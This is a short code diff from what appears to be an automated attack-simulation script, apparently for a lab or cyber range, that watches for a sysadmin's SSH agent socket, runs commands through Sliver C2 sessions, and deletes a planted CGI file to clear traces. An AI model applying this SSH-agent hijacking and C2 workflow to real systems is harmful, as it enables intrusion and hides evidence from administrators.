@@ -151,7 +151,7 @@ except:
         
     if not socket_path:
         log("[-] Timeout waiting for sysadmin SSH login.")
-        return {"vinzenz_shell_sock": None}
+        return {"vinzenz_beacon": None}
         
     log(f"[+] WATCHER ALERT: SSH Agent socket found at {socket_path}")
 
@@ -188,16 +188,7 @@ except:
     log("[*] Attacker done. Admin simulation will restart apache to clear the leak shortly.")
     sliver_exec(root_sliver_session, "execute -o -- rm -f /usr/local/apache2/cgi-bin/stats.cgi")
 
-    class DummyShell:
-        def close(self): pass
-        def sendall(self, *args): pass
-        def recv(self, *args): return b""
-
-    return {
-        # Return DummyShell so the orchestrator teardown doesn't crash on .close()
-        "vinzenz_shell_sock": DummyShell() if vinzenz_beacon_id else None,
-        "vinzenz_beacon": vinzenz_beacon_id
-    }
+    return {"vinzenz_beacon": vinzenz_beacon_id}
 
 # Test mode — not executed when imported by main.py.
 if __name__ == "__main__":
